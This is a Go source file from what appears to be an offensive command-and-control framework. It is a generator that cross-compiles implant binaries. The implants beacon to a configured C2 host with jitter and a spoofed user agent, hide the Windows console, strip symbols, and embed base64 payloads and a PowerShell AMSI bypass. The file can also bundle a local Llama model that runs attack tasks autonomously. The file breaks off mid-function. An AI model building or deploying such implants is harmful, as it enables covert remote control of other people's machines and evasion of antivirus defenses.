package generator

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"

	"github.com/r74tech/virga/internal/implant/payloads"
	"github.com/r74tech/virga/internal/shared/logger"
)

// BinaryGenerator is responsible for generating binary payloads.
type BinaryGenerator struct {
	TmpDir      string // Temporary directory
	projectRoot string // Cached project root
	mu          sync.RWMutex
}

// BinaryOptions are the options for generating a binary payload.
type BinaryOptions struct {
	C2Host      string         // C2 server host
	C2Port      int            // C2 server port
	URIPath     string         // URI path
	Protocol    string         // "http", "https", "mtls", "dns"
	UserAgent   string         // User agent
	SleepTime   int            // Beacon interval (seconds)
	Jitter      int            // Jitter percentage (up to 50%)
	TargetOS    string         // Target OS: "windows", "linux", "darwin"
	TargetArch  string         // Target architecture: "amd64", "386", "arm64"
	Format      string         // Output format: "exe", "dll", "elf", "so", "dylib", "raw" (shellcode)
	OutputPath  string         // Output file path
	EnableLlama bool           // Enable Llama integration
	LlamaConfig *LlamaOpts     // Llama settings
	ImplantOpts *ImplantOpts   // Implant settings
	Payloads    []PayloadAsset // Embedded payloads bundled with the beacon
	AMSIBypass  string         // PowerShell AMSI bypass snippet
}

// LlamaOpts are the options for Llama AI settings.
type LlamaOpts struct {
	Context          int               // Context window size
	MaxTokens        int               // Maximum number of tokens
	MaxIterations    int               // Maximum iterations per task
	Temperature      float64           // Temperature parameter
	GPULayers        int               // Number of layers to offload to GPU
	SystemPrompt     string            // System prompt preset
	AutoMode         bool              // Enable autonomous mode
	InitialTasks     []InitialTask     // Initial execution tasks
	TaskPrompts      map[string]string // Custom prompts per task
	LogEnabled       bool              // Enable Llama log output
	ForceSelfExtract bool              // Force self-extracting mode (mmap) regardless of model size
}

// InitialTask defines an initial execution task.
type InitialTask struct {
	Type        string `json:"type"`
	Description string `json:"description"`
}

// ImplantOpts are the options for Implant settings.
type ImplantOpts struct {
	LogEnabled  bool   // Enable log output
	LogFilePath string // Log file path (default if empty)
	LogLevel    string // Log level: debug, info, warn, error
	Debug       bool   // Enable debug output during generation
}

// PayloadAsset represents a file bundled with the beacon
type PayloadAsset struct {
	Name         string // Operator-friendly identifier
	Type         string // How the payload will be executed (powershell, ...)
	Content      []byte // Raw payload contents
	CommandsFile string // Optional path to JSON file containing command definitions
}

// NewBinaryGenerator creates a new binary generator.
func NewBinaryGenerator() (*BinaryGenerator, error) {
	// Create a temporary directory
	tmpDir, err := os.MkdirTemp("", "virga-generator-*")
	if err != nil {
		return nil, fmt.Errorf("failed to create temp directory: %w", err)
	}

	return &BinaryGenerator{
		TmpDir: tmpDir,
	}, nil
}

// GetDefaultOptions gets the default options.
func (g *BinaryGenerator) GetDefaultOptions() BinaryOptions {
	return BinaryOptions{
		C2Host:     "localhost",
		C2Port:     443,
		URIPath:    "api/updates",
		Protocol:   "https",
		UserAgent:  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
		SleepTime:  60,
		Jitter:     20,
		TargetOS:   runtime.GOOS,
		TargetArch: runtime.GOARCH,
		Format:     getDefaultFormat(runtime.GOOS),
		OutputPath: fmt.Sprintf("payload-%s-%s.%s", runtime.GOOS, runtime.GOARCH, getDefaultFormat(runtime.GOOS)),
		AMSIBypass: payloads.GetPowerShellAmsiBypass(),
	}
}

// Generate generates a binary.
func (g *BinaryGenerator) Generate(opts BinaryOptions) (data []byte, err error) {
	// Ensure cleanup on error
	defer func() {
		if err != nil {
			g.Cleanup() // Always cleanup on error
		}
	}()

	// Apply defaults
	g.applyDefaults(&opts)

	// Validate options
	if err := g.validateOptions(&opts); err != nil {
		return nil, err
	}

	// Validate numeric ranges
	if err := g.validateNumericRanges(opts); err != nil {
		return nil, err
	}

	// Build the implant
	binary, err := g.buildImplant(opts)
	if err != nil {
		return nil, fmt.Errorf("failed to build binary: %w", err)
	}

	return binary, nil
}

// SaveToFile saves the binary to a file.
func (g *BinaryGenerator) SaveToFile(data []byte, filePath string) error {
	// Validate inputs
	if len(data) == 0 {
		return fmt.Errorf("cannot save empty data to file")
	}
	if filePath == "" {
		return fmt.Errorf("file path cannot be empty")
	}

	// Clean the file path
	cleanPath := filepath.Clean(filePath)

	// Get absolute path
	absPath, err := filepath.Abs(cleanPath)
	if err != nil {
		return fmt.Errorf("failed to get absolute path: %w", err)
	}

	// Create directory if it doesn't exist
	dir := filepath.Dir(absPath)
	if dir != "." && dir != "" {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			return fmt.Errorf("failed to create directory %s: %w", dir, err)
		}
	}

	// Check if file already exists
	if _, err := os.Stat(absPath); err == nil {
		// File exists, you might want to add a confirmation or backup logic here
		logger.Warn("File %s already exists and will be overwritten", absPath)
	}

	// Write to file
	if err := os.WriteFile(absPath, data, 0o755); err != nil {
		return fmt.Errorf("failed to write file %s: %w", absPath, err)
	}

	return nil
}

// Cleanup removes temporary files.
func (g *BinaryGenerator) Cleanup() error {
	if g.TmpDir != "" && g.TmpDir != "." {
		return os.RemoveAll(g.TmpDir)
	}
	return nil
}

func (g *BinaryGenerator) findProjectRoot() (string, error) {
	// Check if we already have it cached
	g.mu.RLock()
	if g.projectRoot != "" {
		defer g.mu.RUnlock()
		return g.projectRoot, nil
	}
	g.mu.RUnlock()

	// Find and cache the project root
	g.mu.Lock()
	defer g.mu.Unlock()

	// Double-check in case another goroutine found it
	if g.projectRoot != "" {
		return g.projectRoot, nil
	}

	path, err := os.Getwd()
	if err != nil {
		return "", err
	}

	for {
		if _, err := os.Stat(filepath.Join(path, "go.mod")); err == nil {
			g.projectRoot = path
			return path, nil
		}

		parent := filepath.Dir(path)
		if parent == path {
			return "", fmt.Errorf("go.mod not found in any parent directory")
		}
		path = parent
	}
}

// buildImplant builds the implant.
func (g *BinaryGenerator) buildImplant(opts BinaryOptions) ([]byte, error) {
	// Prepare output path
	outputPath := g.prepareOutputPath(opts)

	// Get project root
	projectRoot, err := g.findProjectRoot()
	if err != nil {
		return nil, fmt.Errorf("failed to find project root: %w", err)
	}

	// Verify implant source exists
	if err := g.verifyImplantSource(projectRoot); err != nil {
		return nil, err
	}

	// Handle Llama setup if enabled
	if opts.EnableLlama {
		if err := g.prepareLlamaBuild(opts); err != nil {
			return nil, err
		}
		defer g.restoreGoMod() // Always restore go.mod
	}

	// Write embedded payload configuration (if any)
	cleanupPayloads, err := g.writePayloadInitFile(projectRoot, opts)
	if err != nil {
		return nil, fmt.Errorf("failed to prepare payload configuration: %w", err)
	}
	defer cleanupPayloads()

	// Create and execute the build command
	buildCmd, err := g.createBuildCommand(opts, projectRoot, outputPath)
	if err != nil {
		return nil, err
	}

	// Execute build with debug flag if available
	debug := false
	if opts.ImplantOpts != nil {
		debug = opts.ImplantOpts.Debug
	}
	if err := g.executeBuild(buildCmd, debug); err != nil {
		return nil, err
	}

	// Append model for self-extracting mode (always used when Llama is enabled)
	if opts.EnableLlama {
		logger.Info("Appending model for llama_selfextract mode...")
		if err := g.appendLargeModel(outputPath, projectRoot); err != nil {
			// Log warning but don't fail - model might not exist
			logger.Debug("Model append check: %v", err)
		}
	}

	// Read the generated binary
	binary, err := os.ReadFile(outputPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read generated binary: %w", err)
	}

	logger.Debug("Successfully generated binary: %d bytes", len(binary))
	return binary, nil
}

// prepareOutputPath determines the output path for the generated binary.
func (g *BinaryGenerator) prepareOutputPath(opts BinaryOptions) string {
	outputPath := filepath.Join(g.TmpDir, "implant")
	if opts.TargetOS == "windows" {
		outputPath += ".exe"
	}
	return outputPath
}

// verifyImplantSource checks that the implant source code exists.
func (g *BinaryGenerator) verifyImplantSource(projectRoot string) error {
	implantSourcePath := filepath.Join(projectRoot, "internal", "implant")
	if _, err := os.Stat(implantSourcePath); err != nil {
		return fmt.Errorf("implant source path not found: %s: %w", implantSourcePath, err)
	}
	return nil
}

// prepareLlamaBuild prepares the build environment for Llama integration.
func (g *BinaryGenerator) prepareLlamaBuild(opts BinaryOptions) error {
	// Prepare model parts (split if > 1.9GB)
	if err := g.prepareModelParts(); err != nil {
		return fmt.Errorf("failed to prepare model parts: %w", err)
	}

	// Update go.mod replace directive
	if err := g.updateGoModReplace(opts); err != nil {
		return fmt.Errorf("failed to update go.mod replace: %w", err)
	}

	// Check Llama dependencies
	if err := g.checkLlamaDependencies(opts); err != nil {
		return fmt.Errorf("llama dependencies check failed: %w", err)
	}

	return nil
}

// shouldAppendModel checks if we should append the model to the binary.
func (g *BinaryGenerator) shouldAppendModel(projectRoot string) bool {
	modelPath := filepath.Join(projectRoot, "internal", "implant", "llama", "models", "model.gguf")
	modelInfo, err := os.Stat(modelPath)
	if err != nil {
		return false
	}

	const maxEmbedSize = 1900 * 1024 * 1024 // 1.9GB
	return modelInfo.Size() > maxEmbedSize
}

// appendLargeModel appends the model to the binary for self-extracting mode.
// This function is used for all model sizes to avoid go:embed limitations and enable zero-copy mmap.
func (g *BinaryGenerator) appendLargeModel(binaryPath, projectRoot string) error {
	// Check if model file exists
	modelPath := filepath.Join(projectRoot, "internal", "implant", "llama", "models", "model.gguf")
	modelInfo, err := os.Stat(modelPath)
	if err != nil {
		if os.IsNotExist(err) {
			return nil // No model, nothing to append
		}
		return fmt.Errorf("failed to stat model file: %w", err)
	}

	modelSize := modelInfo.Size()

	// Always append model for self-extracting approach
	// This enables zero-copy mmap loading regardless of size
	if modelSize > 1024*1024*1024 {
		logger.Info("Model detected (%.2f GB), appending to binary for zero-copy mmap...", float64(modelSize)/(1024*1024*1024))
	} else {
		logger.Info("Model detected (%.2f MB), appending to binary for zero-copy mmap...", float64(modelSize)/(1024*1024))
	}

	// Calculate SHA256 of original model
	originalHash, err := g.calculateFileHash(modelPath)
	if err != nil {
		return fmt.Errorf("failed to calculate model hash: %w", err)
	}
	logger.Debug("Original model SHA256: %s", originalHash)

	// Open model file
	modelFile, err := os.Open(modelPath)
	if err != nil {
		return fmt.Errorf("failed to open model file: %w", err)
	}
	defer modelFile.Close()

	// Open binary for appending
	binaryFile, err := os.OpenFile(binaryPath, os.O_APPEND|os.O_WRONLY, 0)
	if err != nil {
		return fmt.Errorf("failed to open binary for appending: %w", err)
	}
	defer binaryFile.Close()

	// Append model data
	bytesCopied, err := io.Copy(binaryFile, modelFile)
	if err != nil {
		return fmt.Errorf("failed to append model data: %w", err)
	}

	if bytesCopied != modelSize {
		return fmt.Errorf("incomplete model copy: expected %d bytes, copied %d", modelSize, bytesCopied)
	}

	// Write metadata (model size as uint64, little-endian)
	if err := binary.Write(binaryFile, binary.LittleEndian, uint64(modelSize)); err != nil {
		return fmt.Errorf("failed to write model metadata: %w", err)
	}

	logger.Info("Successfully appended %.2f GB model to binary", float64(modelSize)/(1024*1024*1024))

	// Verify the embedded model integrity
	if err := g.verifyEmbeddedModel(binaryPath, modelSize, originalHash); err != nil {
		return fmt.Errorf("model verification failed: %w", err)
	}

	logger.Info("✅ Model integrity verified - SHA256 matches")
	return nil
}

// prepareModelParts prepares model parts for embedding by running the split script.
// NOTE: This function now always uses llama_selfextract mode (binary append),
// so it only cleans up model_parts directory and doesn't split the model.
func (g *BinaryGenerator) prepareModelParts() error {
	projectRoot, err := g.findProjectRoot()
	if err != nil {
		return fmt.Errorf("failed to find project root: %w", err)
	}

	// Check if model file exists
	modelPath := filepath.Join(projectRoot, "internal", "implant", "llama", "models", "model.gguf")
	modelInfo, err := os.Stat(modelPath)
	if err != nil {
		if os.IsNotExist(err) {
			logger.Debug("No model file found at %s, skipping model preparation", modelPath)
			// Create empty model_parts directory to allow build to continue
			partsDir := filepath.Join(projectRoot, "internal", "implant", "llama", "model_parts")
			if err := os.MkdirAll(partsDir, 0o755); err != nil {
				return fmt.Errorf("failed to create model_parts directory: %w", err)
			}
			return nil
		}
		return fmt.Errorf("failed to check model file: %w", err)
	}

	modelSize := modelInfo.Size()

	// Always use llama_selfextract mode - model will be appended to binary
	// This avoids go:embed size limitations and memory duplication for all model sizes
	if modelSize > 1024*1024*1024 {
		logger.Info("Model size %.2f GB, will append to binary", float64(modelSize)/(1024*1024*1024))
	} else {
		logger.Info("Model size %.2f MB, will append to binary", float64(modelSize)/(1024*1024))
	}

	// Clean up old model_parts to prevent go:embed from reading them
	// This avoids memory explosion during go build when using llama_selfextract mode
	partsDir := filepath.Join(projectRoot, "internal", "implant", "llama", "model_parts")

	// Remove entire directory first to clean up old files
	if err := os.RemoveAll(partsDir); err != nil && !os.IsNotExist(err) {
		logger.Debug("Warning: failed to remove old model_parts: %v", err)
	}

	// Create empty model_parts directory to allow build to continue
	if err := os.MkdirAll(partsDir, 0o755); err != nil {
		return fmt.Errorf("failed to create model_parts directory: %w", err)
	}

	// Create .gitkeep to preserve directory in git
	gitkeepPath := filepath.Join(partsDir, ".gitkeep")
	if err := os.WriteFile(gitkeepPath, []byte(""), 0o644); err != nil {
		logger.Debug("Warning: failed to create .gitkeep: %v", err)
	}

	logger.Debug("Cleaned up model_parts directory for llama_selfextract mode")
	return nil
}

// createBuildCommand creates the go build command with all necessary flags and environment.
func (g *BinaryGenerator) createBuildCommand(opts BinaryOptions, projectRoot, outputPath string) (*exec.Cmd, error) {
	// Build command arguments
	args := []string{"build", "-o", outputPath}

	// Add build tags
	tags := g.getBuildTags(opts)
	if len(tags) > 0 {
		args = append(args, "-tags", strings.Join(tags, ","))
	}

	// Add ldflags
	ldflags := g.buildLDFlags(opts)
	args = append(args, "-ldflags", ldflags)

	// Set build mode
	if g.isSharedLibrary(opts.Format) {
		args = append(args, "-buildmode=c-shared")
	}

	// Add source files
	args = append(args, g.getSourceFiles(opts)...)

	// Create command
	cmd := exec.Command("go", args...)
	cmd.Dir = projectRoot

	// Set environment
	env, err := g.buildEnvironment(opts, projectRoot)
	if err != nil {
		return nil, err
	}
	cmd.Env = env

	return cmd, nil
}

// executeBuild runs the build command and handles output.
func (g *BinaryGenerator) executeBuild(cmd *exec.Cmd, debug bool) error {
	// Debug output only if debug is enabled
	if debug {
		logger.Debug("Working directory: %s", cmd.Dir)
		logger.Debug("Running command: %v", cmd.Args)

		// Build full command line for debug output
		var cmdParts []string
		for _, arg := range cmd.Args {
			if strings.Contains(arg, " ") {
				cmdParts = append(cmdParts, fmt.Sprintf("'%s'", arg))
			} else {
				cmdParts = append(cmdParts, arg)
			}
		}
		logger.Debug("Full command line: %s", strings.Join(cmdParts, " "))
	}

	// Run the build
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		logger.Debug("stdout: %s", stdout.String())
		logger.Debug("stderr: %s", stderr.String())

		if exitErr, ok := err.(*exec.ExitError); ok {
			logger.Debug("Exit code: %d", exitErr.ExitCode())
		}

		return fmt.Errorf("go build failed: %w\nstdout: %s\nstderr: %s", err, stdout.String(), stderr.String())
	}

	return nil
}

// getBuildTags returns the build tags for the compilation.
func (g *BinaryGenerator) getBuildTags(opts BinaryOptions) []string {
	var tags []string

	if opts.EnableLlama {
		// Always use llama_selfextract mode for all model sizes
		// This avoids go:embed size limitations and memory duplication
		logger.Debug("Using llama_selfextract mode (binary append) for all model sizes")

		// Add special tags for Windows cross-compilation
		currentOS := runtime.GOOS
		if currentOS != opts.TargetOS && opts.TargetOS == "windows" {
			tags = append(tags, "llama_selfextract", "prebuilt", "windows_cross")
		} else {
			tags = append(tags, "llama_selfextract", "prebuilt")
		}
	}

	return tags
}

// buildLDFlags constructs the linker flags for the build.
func (g *BinaryGenerator) buildLDFlags(opts BinaryOptions) string {
	pkgPath := "github.com/r74tech/virga/internal/implant/config"
	ldflags := []string{"-s", "-w"} // Strip symbols

	// Basic configuration
	ldflags = append(ldflags, g.buildBasicLDFlags(opts, pkgPath)...)

	// Llama configuration
	if opts.EnableLlama && opts.LlamaConfig != nil {
		ldflags = append(ldflags, g.buildLlamaLDFlags(opts, pkgPath)...)
	}

	// Implant configuration
	if opts.ImplantOpts != nil {
		ldflags = append(ldflags, g.buildImplantLDFlags(opts, pkgPath)...)
	}

	// Windows-specific flags
	if opts.TargetOS == "windows" && g.shouldHideConsole(opts) {
		ldflags = append(ldflags, "-H=windowsgui")
	}

	return strings.Join(ldflags, " ")
}

// buildBasicLDFlags builds the basic configuration flags.
func (g *BinaryGenerator) buildBasicLDFlags(opts BinaryOptions, pkgPath string) []string {
	return []string{
		fmt.Sprintf("-X '%s.BuildC2Host=%s'", pkgPath, opts.C2Host),
		fmt.Sprintf("-X '%s.BuildC2Port=%d'", pkgPath, opts.C2Port),
		fmt.Sprintf("-X '%s.BuildC2Protocol=%s'", pkgPath, opts.Protocol),
		fmt.Sprintf("-X '%s.BuildC2Path=%s'", pkgPath, opts.URIPath),
		fmt.Sprintf("-X '%s.BuildUserAgent=%s'", pkgPath, strings.ReplaceAll(opts.UserAgent, "'", "'\\''")),
		fmt.Sprintf("-X '%s.BuildSleepTime=%d'", pkgPath, opts.SleepTime),
		fmt.Sprintf("-X '%s.BuildJitter=%d'", pkgPath, opts.Jitter),
	}
}

// buildLlamaLDFlags builds the Llama-specific configuration flags.
func (g *BinaryGenerator) buildLlamaLDFlags(opts BinaryOptions, pkgPath string) []string {
	var flags []string
	cfg := opts.LlamaConfig

	// Debug: Print GPU layers value
	fmt.Printf("[DEBUG] buildLlamaLDFlags: GPULayers=%d\n", cfg.GPULayers)

	flags = append(flags, fmt.Sprintf("-X '%s.BuildLlamaEnabled=true'", pkgPath))
	flags = append(flags, fmt.Sprintf("-X '%s.BuildLlamaContext=%d'", pkgPath, cfg.Context))
	flags = append(flags, fmt.Sprintf("-X '%s.BuildLlamaMaxTokens=%d'", pkgPath, cfg.MaxTokens))
	flags = append(flags, fmt.Sprintf("-X '%s.BuildLlamaMaxIterations=%d'", pkgPath, cfg.MaxIterations))
	flags = append(flags, fmt.Sprintf("-X '%s.BuildLlamaTemperature=%f'", pkgPath, cfg.Temperature))
	flags = append(flags, fmt.Sprintf("-X '%s.BuildLlamaGPULayers=%d'", pkgPath, cfg.GPULayers))
	flags = append(flags, fmt.Sprintf("-X '%s.BuildLlamaSystemPrompt=%s'", pkgPath, cfg.SystemPrompt))

	// AutoMode setting (explicitly set true and false)
	if cfg.AutoMode {
		flags = append(flags, fmt.Sprintf("-X '%s.BuildLlamaAutoMode=true'", pkgPath))
	} else {
		flags = append(flags, fmt.Sprintf("-X '%s.BuildLlamaAutoMode=false'", pkgPath))
	}

	// LogEnabled setting (explicitly set true and false)
	if cfg.LogEnabled {
		flags = append(flags, fmt.Sprintf("-X '%s.BuildLlamaLogEnabled=true'", pkgPath))
	} else {
		flags = append(flags, fmt.Sprintf("-X '%s.BuildLlamaLogEnabled=false'", pkgPath))
	}

	// Marshal initial tasks
	if len(cfg.InitialTasks) > 0 {
		if tasksJSON, err := json.Marshal(cfg.InitialTasks); err == nil {
			tasksBase64 := base64.StdEncoding.EncodeToString(tasksJSON)
			flags = append(flags, fmt.Sprintf("-X '%s.BuildLlamaInitialTasks=%s'", pkgPath, tasksBase64))
		}
	}

	// Marshal task prompts
	if len(cfg.TaskPrompts) > 0 {
		if promptsJSON, err := json.Marshal(cfg.TaskPrompts); err == nil {
			promptsBase64 := base64.StdEncoding.EncodeToString(promptsJSON)
			flags = append(flags, fmt.Sprintf("-X '%s.BuildLlamaTaskPrompts=%s'", pkgPath, promptsBase64))
		}
	}

	// Load and marshal payload command information
	if len(opts.Payloads) > 0 {
		var payloadInfos []map[string]interface{}
		for _, payload := range opts.Payloads {
			if payload.CommandsFile != "" {
				data, err := os.ReadFile(payload.CommandsFile)
				if err != nil {
					fmt.Printf("[WARN] Failed to read payload commands file %s: %v\n", payload.CommandsFile, err)
					continue
				}
				var info map[string]interface{}
				if err := json.Unmarshal(data, &info); err != nil {
					fmt.Printf("[WARN] Failed to parse payload commands JSON %s: %v\n", payload.CommandsFile, err)
					continue
				}
				payloadInfos = append(payloadInfos, info)
			}
		}
		if len(payloadInfos) > 0 {
			if infosJSON, err := json.Marshal(payloadInfos); err == nil {
				infosBase64 := base64.StdEncoding.EncodeToString(infosJSON)
				flags = append(flags, fmt.Sprintf("-X '%s.BuildLlamaPayloadInfos=%s'", pkgPath, infosBase64))
			}
		}
	}

	return flags
}

// buildImplantLDFlags builds the implant-specific configuration flags.
func (g *BinaryGenerator) buildImplantLDFlags(opts BinaryOptions, pkgPath string) []string {
	var flags []string
	cfg := opts.ImplantOpts

	if cfg.LogEnabled {
		flags = append(flags, fmt.Sprintf("-X '%s.BuildImplantLogEnabled=true'", pkgPath))
		if cfg.LogFilePath != "" {
			flags = append(flags, fmt.Sprintf("-X '%s.BuildImplantLogFilePath=%s'", pkgPath, cfg.LogFilePath))
		}
		if cfg.LogLevel != "" {
			flags = append(flags, fmt.Sprintf("-X '%s.BuildImplantLogLevel=%s'", pkgPath, cfg.LogLevel))
		}
	}

	return flags
}

// writePayloadInitFile generates a temporary Go file to embed payload metadata into the build.
func (g *BinaryGenerator) writePayloadInitFile(projectRoot string, opts BinaryOptions) (func(), error) {
	generatedPath := filepath.Join(projectRoot, "internal", "implant", "payloads", "generated_payloads.go")
	defaultAMSI := payloads.GetPowerShellAmsiBypass()
	customAMSI := opts.AMSIBypass != "" && opts.AMSIBypass != defaultAMSI
	hasPayloads := len(opts.Payloads) > 0

	if !hasPayloads && !customAMSI {
		// Ensure no stale file remains from previous runs
		_ = os.Remove(generatedPath)
		return func() {}, nil
	}

	var payloadBase64 string
	if hasPayloads {
		type embeddedPayload struct {
			Name    string `json:"name"`
			Type    string `json:"type"`
			Content string `json:"content"`
		}

		payloadDefs := make([]embeddedPayload, 0, len(opts.Payloads))
		for _, p := range opts.Payloads {
			payloadDefs = append(payloadDefs, embeddedPayload{
				Name:    p.Name,
				Type:    p.Type,
				Content: base64.StdEncoding.EncodeToString(p.Content),
			})
		}

		payloadJSON, err := json.Marshal(payloadDefs)
		if err != nil {
			return func() {}, fmt.Errorf("failed to marshal payload metadata: %w", err)
		}
		payloadBase64 = base64.StdEncoding.EncodeToString(payloadJSON)
	}

	var amsiBase64 string
	if customAMSI {
		amsiBase64 = base64.StdEncoding.EncodeToString([]byte(opts.AMSIBypass))
	}

	plBuilder := &strings.Builder{}
	plBuilder.WriteString("package payloads\n\nfunc init() {\n")
	if payloadBase64 != "" {
		fmt.Fprintf(plBuilder, "\tBuildPayloadsBase64 = \"%s\"\n", payloadBase64)
	}
	if amsiBase64 != "" {
		fmt.Fprintf(plBuilder, "\tBuildPowerShellAmsiBypassBase64 = \"%s\"\n", amsiBase64)
	}
	plBuilder.WriteString("}\n")

	if err := os.WriteFile(generatedPath, []byte(plBuilder.String()), 0o600); err != nil {
		return func() {}, fmt.Errorf("failed to write payload init file: %w", err)
	}

	cleanup := func() {
		os.Remove(generatedPath)
	}

	return cleanup, nil
}

// shouldHideConsole determines if the console window should be hidden on Windows.
func (g *BinaryGenerator) shouldHideConsole(opts BinaryOptions) bool {
	// Show console if any logging is enabled
	if opts.ImplantOpts != nil && opts.ImplantOpts.LogEnabled {
		return false
	}
	if opts.EnableLlama && opts.LlamaConfig != nil && opts.LlamaConfig.LogEnabled {
		return false
	}
	return true
}

// isSharedLibrary checks if the format is a shared library.
func (g *BinaryGenerator) isSharedLibrary(format string) bool {
	switch format {
	case "dll", "so", "dylib":
		return true
	}
	return false
}

// getSourceFiles returns the source files to compile.
func (g *BinaryGenerator) getSourceFiles(opts BinaryOptions) []string {
	if opts.EnableLlama {
		return []string{"./internal/implant/main.go", "./internal/implant/llama_init.go"}
	}
	return []string{"./internal/implant/main.go"}
}

// buildEnvironment creates the environment variables for the build.
func (g *BinaryGenerator) buildEnvironment(opts BinaryOptions, projectRoot string) ([]string, error) {
	env := os.Environ()
	env = append(env, fmt.Sprintf("GOOS=%s", opts.TargetOS))
	env = append(env, fmt.Sprintf("GOARCH=%s", opts.TargetArch))

	// Configure CGO if needed
	if g.needsCGO(opts) {
		env = append(env, "CGO_ENABLED=1")

		// Configure CGO for Llama if enabled
		if opts.EnableLlama {
			if err := g.configureLlamaCGO(&env, opts, projectRoot); err != nil {
				return nil, err
			}
		}

		// Configure cross-compilation if needed
		currentOS := g.detectBuildOS()
		if currentOS != opts.TargetOS {
			if err := g.configureCrossCompilation(&env, opts, currentOS); err != nil {
				return nil, err
			}
		}

		// Apply platform-specific CGO flags
		g.applyPlatformCGOFlags(&env, opts)
	} else {
		env = append(env, "CGO_ENABLED=0")
	}

	return env, nil
}

// needsCGO determines if CGO is required for the build.
func (g *BinaryGenerator) needsCGO(opts BinaryOptions) bool {
	return opts.EnableLlama || g.isSharedLibrary(opts.Format)
}

// configureLlamaCGO configures CGO flags for Llama integration.
func (g *BinaryGenerator) configureLlamaCGO(env *[]string, opts BinaryOptions, projectRoot string) error {
	libDirName := g.getLlamaLibraryDir(opts.TargetOS, opts.TargetArch)
	libPath := filepath.Join(projectRoot, "internal", "implant", "llama", "libs", libDirName)

	cgoLdflags := fmt.Sprintf("-L%s", libPath)
	if existingLdflags := os.Getenv("CGO_LDFLAGS"); existingLdflags != "" {
		cgoLdflags = existingLdflags + " " + cgoLdflags
	}
	*env = append(*env, fmt.Sprintf("CGO_LDFLAGS=%s", cgoLdflags))

	logger.Debug("Using Llama library from: %s", libPath)
	return nil
}

// detectBuildOS detects the actual build OS (handles cross-compilation scenarios).
func (g *BinaryGenerator) detectBuildOS() string {
	currentOS := runtime.GOOS

	// Try to detect actual OS if running in a compatibility layer
	if _, err := exec.LookPath("uname"); err == nil {
		if out, err := exec.Command("uname", "-s").Output(); err == nil {
			switch strings.TrimSpace(strings.ToLower(string(out))) {
			case "linux":
				currentOS = "linux"
			case "darwin":
				currentOS = "darwin"
			case "mingw", "msys", "cygwin":
				currentOS = "windows"
			}
		}
	}

	return currentOS
}

// configureCrossCompilation sets up cross-compilation environment.
func (g *BinaryGenerator) configureCrossCompilation(env *[]string, opts BinaryOptions, currentOS string) error {
	logger.Info("Cross-compiling from %s to %s", currentOS, opts.TargetOS)

	switch opts.TargetOS {
	case "windows":
		if currentOS == "linux" {
			return g.configureLinuxToWindowsCrossCompile(env, opts)
		} else if currentOS == "darwin" {
			return g.configureDarwinToWindowsCrossCompile(env, opts)
		}
	case "linux":
		if currentOS == "darwin" {
			logger.Warn("Cross-compiling from macOS to Linux with CGO requires a cross-compiler")
		}
	}

	return nil
}

// configureLinuxToWindowsCrossCompile sets up Linux to Windows cross-compilation.
func (g *BinaryGenerator) configureLinuxToWindowsCrossCompile(env *[]string, opts BinaryOptions) error {
	var cc, cxx string

	switch opts.TargetArch {
	case "amd64":
		cc = "x86_64-w64-mingw32-gcc"
		cxx = "x86_64-w64-mingw32-g++"
	case "386":
		cc = "i686-w64-mingw32-gcc"
		cxx = "i686-w64-mingw32-g++"
	case "arm64":
		cc = "aarch64-w64-mingw32-gcc"
		cxx = "aarch64-w64-mingw32-g++"
	default:
		return fmt.Errorf("unsupported Windows architecture for cross-compilation: %s", opts.TargetArch)
	}

	// Validate compiler exists
	if err := g.validateCompiler(cc); err != nil {
		g.printCrossCompilerHelp(cc)
		return err
	}

	*env = append(*env, fmt.Sprintf("CC=%s", cc))
	*env = append(*env, fmt.Sprintf("CXX=%s", cxx))

	return nil
}

// configureDarwinToWindowsCrossCompile sets up macOS to Windows cross-compilation.
func (g *BinaryGenerator) configureDarwinToWindowsCrossCompile(env *[]string, opts BinaryOptions) error {
	var cc, cxx string

	switch opts.TargetArch {
	case "amd64":
		cc = "x86_64-w64-mingw32-gcc"
		cxx = "x86_64-w64-mingw32-g++"
	case "386":
		cc = "i686-w64-mingw32-gcc"
		cxx = "i686-w64-mingw32-g++"
	case "arm64":
		cc = "aarch64-w64-mingw32-gcc"
		cxx = "aarch64-w64-mingw32-g++"
	default:
		return fmt.Errorf("unsupported Windows architecture for cross-compilation: %s", opts.TargetArch)
	}

	// Validate compiler exists
	if err := g.validateCompiler(cc); err != nil {
		g.printCrossCompilerHelpMacOS(cc)
		return err
	}

	*env = append(*env, fmt.Sprintf("CC=%s", cc))
	*env = append(*env, fmt.Sprintf("CXX=%s", cxx))

	return nil
}

// validateCompiler checks if a compiler is available.
func (g *BinaryGenerator) validateCompiler(compiler string) error {
	if _, err := exec.LookPath(compiler); err != nil {
		return fmt.Errorf("cross-compiler not found: %s", compiler)
	}
	return nil
}

// printCrossCompilerHelp prints installation instructions for cross-compilers.
func (g *BinaryGenerator) printCrossCompilerHelp(compiler string) {
	logger.Error("Cross-compiler '%s' not found!", compiler)
	logger.Error("To install the MinGW cross-compiler on:")
	logger.Error("  - Ubuntu/Debian: sudo apt-get install gcc-mingw-w64-x86-64 g++-mingw-w64-x86-64")
	logger.Error("  - Fedora: sudo dnf install mingw64-gcc mingw64-g++")
	logger.Error("  - Arch Linux: sudo pacman -S mingw-w64-gcc")
	logger.Error("  - Kali Linux: sudo apt-get install gcc-mingw-w64-x86-64 g++-mingw-w64-x86-64")
}

// printCrossCompilerHelpMacOS prints installation instructions for cross-compilers on macOS.
func (g *BinaryGenerator) printCrossCompilerHelpMacOS(compiler string) {
	logger.Error("Cross-compiler '%s' not found!", compiler)
	logger.Error("To install the MinGW cross-compiler on macOS:")
	logger.Error("  - Using Homebrew: brew install mingw-w64")
	logger.Error("  - Using MacPorts: sudo port install x86_64-w64-mingw32-gcc")
	logger.Error("")
	logger.Error("After installation, the following compilers should be available:")
	logger.Error("  - x86_64-w64-mingw32-gcc (for amd64)")
	logger.Error("  - i686-w64-mingw32-gcc (for 386)")
}

// applyPlatformCGOFlags applies platform-specific CGO flags.
func (g *BinaryGenerator) applyPlatformCGOFlags(env *[]string, opts BinaryOptions) {
